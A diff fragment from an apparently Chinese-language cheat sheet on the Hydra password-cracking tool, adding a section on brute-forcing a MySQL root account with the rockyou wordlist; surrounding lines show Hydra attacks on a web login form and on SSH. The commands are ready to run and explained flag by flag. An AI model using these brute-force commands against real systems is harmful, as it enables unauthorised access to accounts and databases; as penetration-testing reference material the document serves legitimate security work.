@@ -32,6 +32,14 @@ hydra -l admin -P passwords.txt target_ip http-post-form "/login.php:username=^U
     - `username=^USER^&password=^PASS^` 表示表单中用户名和密码的字段名，`^USER^` 和 `^PASS^` 是 `Hydra` 的占位符，分别代表用户名和密码。
     - `F=incorrect` 表示当页面中包含 `incorrect` 字符串时，说明密码错误。
 
+爆破mysql
+hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.100
+
+    -l root：指定用户名
+
+    -P rockyou.txt：指定密码字典
+
+    mysql://192.168.1.100：目标 MySQL 服务地址
 ### 4. 限制并发任务数
 ```bash
 hydra -l user -P passlist.txt -t 4 target_ip ssh
